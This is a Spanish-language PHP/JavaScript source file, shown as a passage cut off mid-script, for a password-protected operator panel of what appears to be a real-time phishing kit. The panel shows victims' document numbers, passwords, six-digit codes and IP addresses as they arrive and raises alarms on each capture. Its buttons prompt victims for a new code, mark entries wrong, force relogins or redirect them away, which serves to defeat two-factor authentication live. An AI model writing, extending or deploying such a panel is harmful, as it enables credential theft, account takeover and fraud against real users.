<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

define('PANEL_PASSWORD', 'Dav2026$sv!Kq7');

// Cerrar sesiÃ³n
if (isset($_GET['logout'])) {
    unset($_SESSION['panel_autenticado']);
    header('Location: panel.php');
    exit;
}

// Procesar inicio de sesiÃ³n
$loginError = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['panel_pass'])) {
    $claveIngresada = (string)$_POST['panel_pass'];
    if ($claveIngresada === PANEL_PASSWORD) {
        $_SESSION['panel_autenticado'] = true;
        header('Location: panel.php');
        exit;
    } else {
        $loginError = 'ContraseÃ±a incorrecta. Intente nuevamente.';
    }
}

// Si no estÃ¡ autenticado, mostrar formulario de acceso exclusivo (solo clave)
if (empty($_SESSION['panel_autenticado'])) {
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso al Panel de Control</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .login-card {
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.35);
            width: 100%;
            max-width: 390px;
            padding: 38px 30px;
            text-align: center;
        }
        .login-icon {
            width: 64px;
            height: 64px;
            background: rgba(237, 28, 39, 0.1);
            color: #ED1C27;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            margin-bottom: 20px;
        }
        .login-title {
            font-size: 22px;
            font-weight: 700;
            color: #0f172a;
            margin-bottom: 6px;
        }
        .login-sub {
            font-size: 13.5px;
            color: #64748b;
            margin-bottom: 26px;
        }
        .input-group {
            position: relative;
            margin-bottom: 22px;
            text-align: left;
        }
        .input-group label {
            display: block;
            font-size: 11.5px;
            font-weight: 600;
            color: #475569;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 6px;
        }
        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }
        .input-wrapper i.lock-icon {
            position: absolute;
            left: 14px;
            color: #94a3b8;
            font-size: 15px;
        }
        .login-input {
            width: 100%;
            padding: 12px 42px 12px 40px;
            border: 1.5px solid #e2e8f0;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 500;
            outline: none;
            transition: all 0.2s;
            background: #f8fafc;
        }
        .login-input:focus {
            border-color: #ED1C27;
            background: #ffffff;
            box-shadow: 0 0 0 3px rgba(237, 28, 39, 0.12);
        }
        .toggle-btn {
            position: absolute;
            right: 12px;
            background: transparent;
            border: none;
            color: #94a3b8;
            cursor: pointer;
            padding: 4px;
            font-size: 15px;
        }
        .toggle-btn:hover {
            color: #475569;
        }
        .login-btn {
            width: 100%;
            padding: 13px;
            background: #ED1C27;
            color: #ffffff;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 4px 12px rgba(237, 28, 39, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .login-btn:hover {
            background: #d1141e;
            transform: translateY(-1px);
            box-shadow: 0 6px 16px rgba(237, 28, 39, 0.35);
        }
        .error-msg {
            background: #fee2e2;
            color: #dc2626;
            border: 1px solid #fca5a5;
            padding: 10px 14px;
            border-radius: 8px;
            font-size: 13px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 8px;
            text-align: left;
        }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="login-icon">
            <i class="fa-solid fa-lock"></i>
        </div>
        <h1 class="login-title">Panel de Control</h1>
        <p class="login-sub">Ingrese la clave para acceder al panel</p>

        <?php if (!empty($loginError)): ?>
            <div class="error-msg">
                <i class="fa-solid fa-circle-exclamation"></i>
                <span><?= htmlspecialchars($loginError, ENT_QUOTES, 'UTF-8') ?></span>
            </div>
        <?php endif; ?>

        <form method="POST" action="panel.php">
            <div class="input-group">
                <label for="panel_pass">Clave de Acceso</label>
                <div class="input-wrapper">
                    <i class="fa-solid fa-key lock-icon"></i>
                    <input type="password" id="panel_pass" name="panel_pass" class="login-input" placeholder="â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢" autofocus required autocomplete="current-password">
                    <button type="button" class="toggle-btn" onclick="togglePassLogin()" aria-label="Mostrar u ocultar contraseÃ±a">
                        <i class="fa-solid fa-eye" id="eyeIcon"></i>
                    </button>
                </div>
            </div>

            <button type="submit" class="login-btn">
                <i class="fa-solid fa-right-to-bracket"></i> Ingresar al Panel
            </button>
        </form>
    </div>

    <script>
        function togglePassLogin() {
            const input = document.getElementById('panel_pass');
            const icon = document.getElementById('eyeIcon');
            if (input.type === 'password') {
                input.type = 'text';
                icon.className = 'fa-solid fa-eye-slash';
            } else {
                input.type = 'password';
                icon.className = 'fa-solid fa-eye';
            }
        }
    </script>
</body>
</html>
<?php
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Control - Cuadros en Tiempo Real</title>
    
    <!-- Fuentes y TipografÃ­as -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@500;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        :root {
            --primary: #ED1C27;
            --primary-hover: #d1141e;
            --bg-body: #f8fafc;
            --bg-card: #ffffff;
            --border-color: #e2e8f0;
            --text-main: #0f172a;
            --text-muted: #64748b;
            --success: #10b981;
            --danger: #ef4444;
            --danger-bg: #fee2e2;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        }

        body {
            background-color: var(--bg-body);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Barra Superior */
        .navbar {
            background: #ffffff;
            border-bottom: 1px solid var(--border-color);
            padding: 14px 28px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 1px 3px rgba(0,0,0,0.02);
        }

        .nav-brand {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .brand-icon {
            width: 38px;
            height: 38px;
            background: rgba(237, 28, 39, 0.1);
            color: var(--primary);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
        }

        .brand-title {
            font-size: 18px;
            font-weight: 700;
            color: var(--text-main);
        }

        .nav-actions {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 8px 16px;
            border-radius: 8px;
            font-size: 13.5px;
            font-weight: 500;
            cursor: pointer;
            border: 1px solid transparent;
            transition: background-color 0.15s ease, border-color 0.15s ease;
            text-decoration: none;
            outline: none;
        }

        .btn-primary {
            background-color: var(--primary);
            color: #fff;
        }
        .btn-primary:hover {
            background-color: var(--primary-hover);
        }

        .btn-outline {
            background-color: #fff;
            border-color: var(--border-color);
            color: var(--text-main);
        }
        .btn-outline:hover {
            background-color: #f1f5f9;
        }

        .btn-danger {
            background-color: var(--danger-bg);
            border-color: #fca5a5;
            color: #dc2626;
        }
        .btn-danger:hover {
            background-color: var(--danger);
            color: #fff;
        }

        .toggle-sound {
            display: flex;
            align-items: center;
            gap: 8px;
            background: #fff;
            padding: 7px 14px;
            border-radius: 8px;
            border: 1px solid var(--border-color);
            font-size: 13px;
            cursor: pointer;
            user-select: none;
            transition: all 0.2s;
        }
        .toggle-sound.active {
            color: var(--primary);
            border-color: #fca5a5;
            background: #fff5f5;
        }

        .alarm-select {
            background: #fff;
            border: 1px solid var(--border-color);
            padding: 7px 12px;
            border-radius: 8px;
            font-size: 13px;
            font-weight: 500;
            color: var(--text-main);
            cursor: pointer;
            outline: none;
            transition: border-color 0.15s;
        }
        .alarm-select:focus {
            border-color: var(--primary);
        }

        /* Contenedor Principal */
        .container {
            max-width: 1400px;
            width: 100%;
            margin: 0 auto;
            padding: 24px;
            flex: 1;
        }

        /* Resumen de MÃ©tricas */
        .stats-bar {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 16px;
            margin-bottom: 24px;
        }

        .stat-card {
            background: #fff;
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 16px 20px;
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .stat-icon {
            width: 44px;
            height: 44px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }
        .stat-icon.red { background: rgba(237, 28, 39, 0.1); color: var(--primary); }
        .stat-icon.green { background: rgba(16, 185, 129, 0.1); color: var(--success); }
        .stat-icon.blue { background: rgba(37, 99, 235, 0.1); color: #2563eb; }
        .stat-icon.purple { background: rgba(139, 92, 246, 0.1); color: #8b5cf6; }

        .stat-info h4 {
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: var(--text-muted);
            margin-bottom: 4px;
        }

        .stat-info p {
            font-size: 20px;
            font-weight: 700;
            color: var(--text-main);
        }

        /* Barra de Herramientas */
        .toolbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 16px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }

        .search-box {
            position: relative;
            flex: 1;
            max-width: 450px;
            min-width: 260px;
        }

        .search-box i {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-muted);
        }

        .search-box input {
            width: 100%;
            padding: 10px 14px 10px 40px;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            font-size: 14px;
            outline: none;
            background: #fff;
            transition: border-color 0.15s;
        }

        .search-box input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(237, 28, 39, 0.1);
        }

        /* Estado del Sistema: Fijo, sin parpadeo */
        .live-status {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 13px;
            color: var(--text-muted);
        }

        .status-dot {
            width: 9px;
            height: 9px;
            background-color: var(--success);
            border-radius: 50%;
            display: inline-block;
        }

        /* CuadrÃ­cula de Cuadros */
        .cards-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
            gap: 20px;
        }

        /* Cuadro de InformaciÃ³n: Estable y sin parpadeo */
        .info-card {
            background: #ffffff;
            border: 1px solid var(--border-color);
            border-radius: 12px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            transition: border-color 0.15s, box-shadow 0.15s;
        }

        .info-card:hover {
            border-color: #cbd5e1;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
        }

        .card-header {
            padding: 12px 16px;
            background: #f8fafc;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .cuadro-tag {
            background: #0f172a;
            color: #ffffff;
            font-size: 12px;
            font-weight: 700;
            padding: 4px 9px;
            border-radius: 6px;
            letter-spacing: 0.3px;
        }

        .card-body {
            padding: 18px 16px;
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 13px;
        }

        .field-group {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }

        .field-label {
            font-size: 11px;
            font-weight: 600;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .field-value-box {
            background: #f8fafc;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 9px 12px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            min-height: 44px;
        }

        .field-value-doc {
            font-family: 'JetBrains Mono', monospace;
            font-size: 17.5px;
            font-weight: 700;
            color: var(--primary);
            letter-spacing: 1px;
        }

        .field-value-pass {
            font-family: 'JetBrains Mono', monospace;
            font-size: 16px;
            font-weight: 700;
            color: #0f172a;
        }

        .field-value-code {
            font-family: 'JetBrains Mono', monospace;
            font-size: 21px;
            font-weight: 800;
            color: #059669;
            letter-spacing: 3px;
        }

        .field-value-text {
            font-size: 13.5px;
            color: var(--text-main);
            font-weight: 500;
        }

        .field-value-pending {
            font-size: 13px;
            color: #94a3b8;
            font-style: italic;
        }

        .btn-copy {
            background: transparent;
            border: none;
            color: var(--text-muted);
            cursor: pointer;
            padding: 4px 6px;
            border-radius: 4px;
            font-size: 13px;
            transition: all 0.15s;
        }

        .btn-copy:hover {
            color: var(--primary);
            background: #fee2e2;
        }

        .card-footer {
            padding: 10px 16px;
            background: #f8fafc;
            border-top: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .time-text {
            font-size: 11.5px;
            color: var(--text-muted);
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .btn-delete-card {
            background: transparent;
            border: none;
            color: #94a3b8;
            cursor: pointer;
            padding: 5px 8px;
            border-radius: 6px;
            font-size: 13px;
            transition: all 0.15s;
        }

        .btn-delete-card:hover {
            color: var(--danger);
            background: #fee2e2;
        }

        /* Botones de AcciÃ³n en cada Contenedor (Grilla 3x2) */
        .card-actions {
            padding: 12px 14px;
            background: #f8fafc;
            border-top: 1px solid var(--border-color);
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
        }

        .btn-action {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            padding: 8px 6px;
            border-radius: 8px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            border: 1px solid transparent;
            transition: all 0.18s ease;
            text-align: center;
            user-select: none;
            outline: none;
            white-space: nowrap;
        }

        /* AcciÃ³n: Pedir CÃ³digo (6 dÃ­gitos) */
        .btn-action-code {
            background-color: #ecfdf5;
            border-color: #a7f3d0;
            color: #065f46;
        }
        .btn-action-code:hover {
            background-color: #10b981;
            border-color: #059669;
            color: #ffffff;
            box-shadow: 0 2px 6px rgba(16, 185, 129, 0.25);
        }
        .btn-action-code.active {
            background-color: #d1fae5;
            border-color: #10b981;
            color: #047857;
            font-weight: 700;
        }

        /* AcciÃ³n: CÃ³digo ErrÃ³neo */
        .btn-action-code-error {
            background-color: #fff7ed;
            border-color: #fed7aa;
            color: #c2410c;
        }
        .btn-action-code-error:hover {
            background-color: #ea580c;
            border-color: #c2410c;
            color: #ffffff;
            box-shadow: 0 2px 6px rgba(234, 88, 12, 0.25);
        }
        .btn-action-code-error.active {
            background-color: #ffedd5;
            border-color: #f97316;
            color: #9a3412;
            font-weight: 700;
        }

        /* AcciÃ³n: ContraseÃ±a ErrÃ³nea */
        .btn-action-pass-error {
            background-color: #fdf4ff;
            border-color: #f0abfc;
            color: #a21caf;
        }
        .btn-action-pass-error:hover {
            background-color: #c026d3;
            border-color: #a21caf;
            color: #ffffff;
            box-shadow: 0 2px 6px rgba(192, 38, 211, 0.25);
        }
        .btn-action-pass-error.active {
            background-color: #fae8ff;
            border-color: #d946ef;
            color: #86198f;
            font-weight: 700;
        }

        /* AcciÃ³n: Finalizar */
        .btn-action-finalizar {
            background-color: #f0fdf4;
            border-color: #86efac;
            color: #15803d;
        }
        .btn-action-finalizar:hover {
            background-color: #16a34a;
            border-color: #15803d;
            color: #ffffff;
            box-shadow: 0 2px 6px rgba(22, 163, 74, 0.25);
        }
        .btn-action-finalizar.active {
            background-color: #dcfce7;
            border-color: #22c55e;
            color: #166534;
            font-weight: 700;
        }

        /* AcciÃ³n: Relogin */
        .btn-action-relogin {
            background-color: #fffbeb;
            border-color: #fcd34d;
            color: #b45309;
        }
        .btn-action-relogin:hover {
            background-color: #f59e0b;
            border-color: #d97706;
            color: #ffffff;
            box-shadow: 0 2px 6px rgba(245, 158, 11, 0.25);
        }
        .btn-action-relogin.active {
            background-color: #fef3c7;
            border-color: #f59e0b;
            color: #92400e;
            font-weight: 700;
        }

        /* AcciÃ³n: Bloquear */
        .btn-action-bloquear {
            background-color: #fef2f2;
            border-color: #fca5a5;
            color: #dc2626;
        }
        .btn-action-bloquear:hover {
            background-color: #dc2626;
            border-color: #b91c1c;
            color: #ffffff;
            box-shadow: 0 2px 6px rgba(220, 38, 38, 0.25);
        }
        .btn-action-bloquear.active {
            background-color: #fee2e2;
            border-color: #dc2626;
            color: #991b1b;
            font-weight: 700;
        }

        .btn-action:active {
            transform: scale(0.97);
        }

        /* Banners de estado de acciÃ³n */
        .action-banner {
            margin: 0 16px 12px 16px;
            padding: 8px 11px;
            border-radius: 7px;
            font-size: 12px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .relogin-banner {
            background: #fffbeb;
            color: #92400e;
            border: 1px solid #fde68a;
        }
        .finalizar-banner {
            background: #ecfdf5;
            color: #065f46;
            border: 1px solid #a7f3d0;
        }
        .bloqueado-banner {
            background: #fef2f2;
            color: #991b1b;
            border: 1px solid #fecaca;
        }
        .code-banner {
            background: #eff6ff;
            color: #1e40af;
            border: 1px solid #bfdbfe;
        }
        .code-received-banner {
            background: #ecfdf5;
            color: #047857;
            border: 1px solid #6ee7b7;
            font-weight: 600;
        }
        .pass-received-banner {
            background: #fefce8;
            color: #854d0e;
            border: 1px solid #fef08a;
        }
        .esperando-banner {
            background: #f8fafc;
            color: #64748b;
            border: 1px dashed #cbd5e1;
        }

        /* Badges de estado en el header */
        .badge-status {
            font-size: 11.5px;
            font-weight: 600;
            padding: 3px 9px;
            border-radius: 12px;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }
        .badge-status-relogin {
            background: #fef3c7;
            color: #92400e;
        }
        .badge-status-finalizar {
            background: #d1fae5;
            color: #065f46;
        }
        .badge-status-bloqueado {
            background: #fee2e2;
            color: #b91c1c;
        }
        .badge-status-code {
            background: #dbeafe;
            color: #1e40af;
        }
        .badge-status-success {
            background: #d1fae5;
            color: #065f46;
        }

        /* Estados de presencia: En LÃ­nea / SaliÃ³ de la web */
        .badge-online {
            font-size: 11.5px;
            font-weight: 700;
            padding: 3px 10px;
            border-radius: 12px;
            background: #dcfce7;
            color: #15803d;
            border: 1px solid #86efac;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            letter-spacing: 0.2px;
        }

        .pulse-dot {
            width: 7px;
            height: 7px;
            background-color: #22c55e;
            border-radius: 50%;
            box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7);
            animation: pulse-green 1.8s infinite;
        }

        @keyframes pulse-green {
            0% {
                transform: scale(0.95);
                box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7);
            }
            70% {
                transform: scale(1);
                box-shadow: 0 0 0 6px rgba(34, 197, 94, 0);
            }
            100% {
                transform: scale(0.95);
                box-shadow: 0 0 0 0 rgba(34, 197, 94, 0);
            }
        }

        .badge-offline {
            font-size: 11.5px;
            font-weight: 600;
            padding: 3px 10px;
            border-radius: 12px;
            background: #fee2e2;
            color: #b91c1c;
            border: 1px solid #fca5a5;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            letter-spacing: 0.2px;
        }

        /* ConfiguraciÃ³n de URL de redirecciÃ³n en barra superior */
        .redirect-config {
            display: flex;
            align-items: center;
            gap: 7px;
            background: #fff;
            padding: 6px 12px;
            border-radius: 8px;
            border: 1px solid var(--border-color);
        }
        .redirect-config input {
            border: none;
            outline: none;
            font-size: 12.5px;
            width: 175px;
            color: var(--text-main);
            background: transparent;
            font-family: inherit;
        }
        .redirect-config input:focus {
            color: var(--primary);
        }

        /* Estado VacÃ­o */
        .empty-state {
            grid-column: 1 / -1;
            padding: 70px 20px;
            text-align: center;
            color: var(--text-muted);
            background: #fff;
            border: 1px dashed #cbd5e1;
            border-radius: 12px;
        }

        .empty-state i {
            font-size: 42px;
            color: #cbd5e1;
            margin-bottom: 12px;
        }

        .empty-state h3 {
            font-size: 16px;
            color: var(--text-main);
            margin-bottom: 6px;
        }

        .empty-state p {
            font-size: 13.5px;
        }

        /* NotificaciÃ³n Toast */
        .toast {
            position: fixed;
            bottom: 24px;
            right: 24px;
            background: #0f172a;
            color: #fff;
            padding: 12px 20px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 13.5px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            transform: translateY(100px);
            opacity: 0;
            transition: all 0.25s ease;
            z-index: 1000;
        }

        .toast.show {
            transform: translateY(0);
            opacity: 1;
        }

        .toast i {
            color: #34d399;
        }
    </style>
</head>
<body>

    <!-- Barra Superior -->
    <header class="navbar">
        <div class="nav-brand">
            <div class="brand-icon">
                <i class="fa-solid fa-table-cells-large"></i>
            </div>
            <div>
                <h1 class="brand-title">Panel de Control</h1>
            </div>
        </div>

        <div class="nav-actions">
            <div class="redirect-config" title="URL hacia donde redirige el botÃ³n Finalizar">
                <i class="fa-solid fa-arrow-up-right-from-square" style="color:var(--text-muted); font-size:12px;"></i>
                <span style="font-size:12px; font-weight:600; color:var(--text-muted);">Redir:</span>
                <input type="url" id="globalRedirectUrl" value="https://www.google.com" placeholder="https://..." onchange="guardarRedirectUrl(this.value)">
            </div>

            <div class="toggle-sound active" id="soundBtn" onclick="toggleSound()">
                <i class="fa-solid fa-volume-high" id="soundIcon"></i>
                <span id="soundLabel">Alarma</span>
            </div>

            <select id="alarmSelect" class="alarm-select" onchange="cambiarTipoAlarma(this.value)" title="Seleccionar tipo de alarma">
                <option value="alarma1.wav">ðŸš¨ Sirena Fuerte (x3)</option>
                <option value="alarma2.wav">ðŸ“¢ Chicharra Industrial (x3)</option>
                <option value="alarma3.wav">ðŸš” Sirena Dual (x3)</option>
            </select>

            <button class="btn btn-outline" onclick="emitirSonido();" title="Probar el sonido de alarma">
                <i class="fa-solid fa-bullhorn"></i> Probar Alarma
            </button>

            <button class="btn btn-danger" onclick="confirmarVaciar()" title="Eliminar todos los cuadros">
                <i class="fa-solid fa-trash-can"></i> Vaciar Todo
            </button>

            <a href="index.php" target="_blank" class="btn btn-primary" title="Abrir pÃ¡gina del cliente">
                <i class="fa-solid fa-arrow-up-right-from-square"></i> Ver Formulario
            </a>

            <a href="panel.php?logout=1" class="btn btn-outline" title="Cerrar sesiÃ³n del panel" style="color:#ef4444; border-color:#fca5a5;">
                <i class="fa-solid fa-right-from-bracket"></i> Salir
            </a>
        </div>
    </header>

    <!-- Contenedor Principal -->
    <main class="container">

        <!-- Barra de BÃºsqueda y SincronizaciÃ³n -->
        <div class="toolbar">
            <div class="search-box">
                <i class="fa-solid fa-magnifying-glass"></i>
                <input type="text" id="searchInput" placeholder="Buscar por documento, clave, cÃ³digo, IP o fecha..." onkeyup="filtrarCuadros()">
            </div>

            <div class="live-status">
                <span class="status-dot"></span>
                <span id="syncText">Sincronizado en tiempo real</span>
                <button class="btn btn-outline" style="padding: 6px 12px; font-size: 12.5px;" onclick="cargarDatos(true)">
                    <i class="fa-solid fa-rotate"></i> Actualizar
                </button>
            </div>
        </div>

        <!-- CuadrÃ­cula donde van pasando los cuadros en orden -->
        <div class="cards-grid" id="cardsGrid">
            <div class="empty-state">
                <i class="fa-solid fa-spinner fa-spin"></i>
                <h3>Cargando informaciÃ³n...</h3>
                <p>Consultando registros</p>
            </div>
        </div>

    </main>

    <!-- NotificaciÃ³n Toast -->
    <div class="toast" id="toast">
        <i class="fa-solid fa-circle-check"></i>
        <span id="toastMsg">Mensaje</span>
    </div>

    <script>
        let registrosGlobales = [];
        let cacheJsonStr = ''; // Evita modificar el DOM si no hay cambios, eliminando el parpadeo
        let conteoPrevio = -1;
        let estadosAnteriores = {};
        let passwordOcultos = {};
        let sonidoHabilitado = true;
        let audioCtx = null;
        let sonidoSeleccionado = localStorage.getItem('panel_tipo_alarma') || 'alarma1.wav';
        let urlRedirSeleccionada = localStorage.getItem('panel_redirect_url') || 'https://www.google.com';

        // Inicializar selectores y configuraciones guardadas
        document.addEventListener('DOMContentLoaded', () => {
            const sel = document.getElementById('alarmSelect');
            if (sel) sel.value = sonidoSeleccionado;

            const redirInput = document.getElementById('globalRedirectUrl');
            if (redirInput) redirInput.value = urlRedirSeleccionada;
        });

        function guardarRedirectUrl(url) {
            urlRedirSeleccionada = url.trim() || 'https://www.google.com';
            localStorage.setItem('panel_redirect_url', urlRedirSeleccionada);
            showToast('URL de redirecciÃ³n guardada');
        }

        function cambiarTipoAlarma(nuevoTipo) {
            sonidoSeleccionado = nuevoTipo;
            localStorage.setItem('panel_tipo_alarma', nuevoTipo);
            emitirSonido();
            showToast('Tipo de alarma cambiado y probado');
        }

        function obtenerAudioContext() {
            if (!audioCtx) {
                const AudioClass = window.AudioContext || window.webkitAudioContext;
                if (AudioClass) audioCtx = new AudioClass();
            }
            if (audioCtx && audioCtx.state === 'suspended') {
                audioCtx.resume().catch(() => {});
            }
            return audioCtx;
        }

        window.addEventListener('click', () => { obtenerAudioContext(); }, { once: true });

        // ReproducciÃ³n de Alarma Fuerte y Ruidosa (3 veces)
        function emitirSonido() {
            if (!sonidoHabilitado) return;
            try {
                const audio = new Audio(sonidoSeleccionado + '?v=' + Date.now());
                audio.volume = 1.0;
                const playPromise = audio.play();
                
                if (playPromise !== undefined) {
                    playPromise.catch(() => {
                        reproducirAlarmaSintetizada();
                    });
                }
            } catch (e) {
                reproducirAlarmaSintetizada();
            }
        }

        // Sintetizador de alarma como respaldo de mÃ¡xima potencia
        function reproducirAlarmaSintetizada() {
            try {
                const ctx = obtenerAudioContext();
                if (!ctx) return;
                const now = ctx.currentTime;

                for (let i = 0; i < 3; i++) {
                    const start = now + (i * 0.45);
                    const dur = 0.35;

                    const osc = ctx.createOscillator();
                    const gain = ctx.createGain();
                    osc.type = 'sawtooth';
                    
                    osc.frequency.setValueAtTime(800, start);
                    osc.frequency.linearRampToValueAtTime(1800, start + 0.20);
                    osc.frequency.linearRampToValueAtTime(800, start + dur);

                    gain.gain.setValueAtTime(0.85, start);
                    gain.gain.exponentialRampToValueAtTime(0.01, start + dur);

                    osc.connect(gain);
                    gain.connect(ctx.destination);

                    osc.start(start);
                    osc.stop(start + dur);
                }
            } catch(e) {}
        }

        function toggleSound() {
            sonidoHabilitado = !sonidoHabilitado;
            const btn = document.getElementById('soundBtn');
            const icon = document.getElementById('soundIcon');
            const label = document.getElementById('soundLabel');

            if (sonidoHabilitado) {
                btn.classList.add('active');
                icon.className = 'fa-solid fa-volume-high';
                label.innerText = 'Sonido';
                showToast('Sonido activado');
                obtenerAudioContext();
            } else {
                btn.classList.remove('active');
                icon.className = 'fa-solid fa-volume-xmark';
                label.innerText = 'Silenciado';
                showToast('Sonido silenciado');
            }
        }

        function showToast(mensaje) {
            const toast = document.getElementById('toast');
            const msg = document.getElementById('toastMsg');
            msg.innerText = mensaje;
            toast.classList.add('show');
            setTimeout(() => { toast.classList.remove('show'); }, 2800);
        }

        function copiarTexto(texto, aviso = 'Copiado al portapapeles') {
            if (!texto) return;
            navigator.clipboard.writeText(texto).then(() => {
                showToast(aviso);
            }).catch(() => {
                showToast('Error al copiar');
            });
        }

        function togglePassVisibility(id, passVal) {
            passwordOcultos[id] = !passwordOcultos[id];
            const span = document.getElementById(`pass-val-${id}`);
            const eye = document.getElementById(`pass-eye-${id}`);
            if (span) {
                if (passwordOcultos[id]) {
                    span.textContent = 'â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢';
                    if (eye) eye.className = 'fa-solid fa-eye';
                } else {
                    span.textContent = passVal;
                    if (eye) eye.className = 'fa-solid fa-eye-slash';
                }
            }
        }

        // Carga y sincronizaciÃ³n en tiempo real SIN PARPADEO
        async function cargarDatos(manual = false) {
            try {
                const res = await fetch('api.php?action=get_data&_t=' + Date.now());
                const data = await res.json();

                if (data.success) {
                    const nuevosRegistros = data.data || [];
                    const nuevoJsonStr = JSON.stringify(nuevosRegistros);

                    // Alertas sonoras y toasts ante eventos relevantes
                    if (conteoPrevio !== -1) {
                        nuevosRegistros.forEach(item => {
                            const id = item.id;
                            const prev = estadosAnteriores[id];

                            if (!prev) {
                                // Nuevo cuadro en orden
                                emitirSonido();
                                showToast(`ðŸ”” Â¡Nuevo Cuadro #${item.numero} recibido!`);
                            } else {
                                // LlegÃ³ contraseÃ±a en un cuadro
                                if (!prev.hasPass && item.password) {
                                    emitirSonido();
                                    showToast(`ðŸ”‘ Â¡ContraseÃ±a recibida en Cuadro #${item.numero}!`);
                                }
                                // LlegÃ³ cÃ³digo de 6 dÃ­gitos en un cuadro
                                if ((!prev.hasCode && item.codigo) || (prev.codeVal !== item.codigo && item.codigo)) {
                                    emitirSonido();
                                    showToast(`ðŸš¨ Â¡CÃ³digo de 6 dÃ­gitos recibido en Cuadro #${item.numero}: ${item.codigo}!`);
                                }
                            }
                        });
                    }

                    // Actualizar mapa de estados anteriores
                    const nuevoMapa = {};
                    nuevosRegistros.forEach(item => {
                        nuevoMapa[item.id] = {
                            hasPass: Boolean(item.password && item.password.length > 0),
                            hasCode: Boolean(item.codigo && item.codigo.length > 0),
                            codeVal: item.codigo || ''
                        };
                    });
                    estadosAnteriores = nuevoMapa;
                    conteoPrevio = nuevosRegistros.length;

                    // Si no hubo cambios en la informaciÃ³n y no es recarga manual, no tocar el DOM -> CERO PARPADEO
